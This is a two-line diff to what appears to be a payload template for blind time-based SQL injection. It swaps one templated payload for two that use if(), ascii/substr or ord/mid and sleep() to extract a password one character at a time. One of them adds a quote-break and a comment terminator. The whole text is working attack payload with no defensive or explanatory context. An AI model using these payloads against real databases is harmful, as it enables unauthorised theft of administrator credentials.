@@ -1,1 +1,2 @@
-0.if({col} = "admin" and ascii(substr({pw},{i},1))={j}, sleep(2) , {col}))
+if({col} = "admin" and ascii(substr({pw},{i},1))={j}, sleep(2) , 1))
+1'or if(ord(mid({pw} , {i} , 1)) = {j} , sleep(3) , 1)-- -
